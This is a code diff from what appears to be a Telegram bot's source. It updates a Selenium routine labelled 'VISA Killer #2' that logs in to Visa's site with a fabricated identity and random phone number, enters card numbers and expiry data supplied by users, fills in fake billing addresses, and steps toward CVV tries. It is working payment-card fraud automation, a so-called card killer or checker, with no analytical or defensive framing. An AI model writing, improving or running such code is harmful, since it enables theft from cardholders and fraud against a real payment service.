@@ -5139,7 +5139,7 @@ async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ==== 6. /kd Command (VISA Killer #2) ==== #
 def run_kd_process(card_input, update_dict):
-    """VISA Killer #2 - OPTIMIZED for consistent speed"""
+    """VISA Killer #2 - FINAL STABLE VERSION"""
     import random, traceback, time, gc
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
@@ -5151,12 +5151,12 @@ def run_kd_process(card_input, update_dict):
 
     try:
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 4)
+        wait = WebDriverWait(driver, 6)
 
         driver.get("https://src.visa.com/login")
 
         # ================================
-        # STEP 1 — EMAIL + LOGIN (UPDATED)
+        # ✅ COOKIE FIX (IMPORTANT)
         # ================================
         try:
             driver.execute_script("arguments[0].click();",
@@ -5164,6 +5164,9 @@ def run_kd_process(card_input, update_dict):
         except:
             pass
 
+        # ================================
+        # STEP 1 — LOGIN FLOW
+        # ================================
         identity = killer_get_fake_identity()
 
         # Email
@@ -5173,7 +5176,7 @@ def run_kd_process(card_input, update_dict):
         driver.execute_script("arguments[0].click();",
             wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Continue']]"))))
 
-        # Phone
+        # Phone (clean + random)
         phone_input = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
         driver.execute_script("arguments[0].value='';", phone_input)
         phone_input.send_keys("202" + "".join(random.choices("0123456789", k=7)))
@@ -5189,7 +5192,7 @@ def run_kd_process(card_input, update_dict):
         killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n⚙️ 2 - Card Fill...")
 
         # ================================
-        # STEP 2 — CARD INFO (UPDATED)
+        # STEP 2 — CARD INFO
         # ================================
         cc, mm, yy, real_cvv = killer_split_card(card_input)
         bin_info, bin_flag = get_cached_bin_info(cc[:6])
@@ -5209,7 +5212,7 @@ def run_kd_process(card_input, update_dict):
         killer_edit_message(update_dict, "🔓 1 - Login (Unlocked)\n🔓 2 - Card Fill (Unlocked)\n⚙️ 3 - Billing Fill...\n🔒 4 - CVV Try")
 
         # ================================
-        # STEP 3 — ADDRESS (UPDATED)
+        # STEP 3 — ADDRESS
         # ================================
         try:
             country_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
@@ -5227,7 +5230,7 @@ def run_kd_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
         wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        # 🔥 UPDATED BUTTON (Add card instead of old submit)
+        # ✅ FINAL BUTTON (NEW FLOW)
         driver.execute_script("arguments[0].click();",
             wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']"))))
 
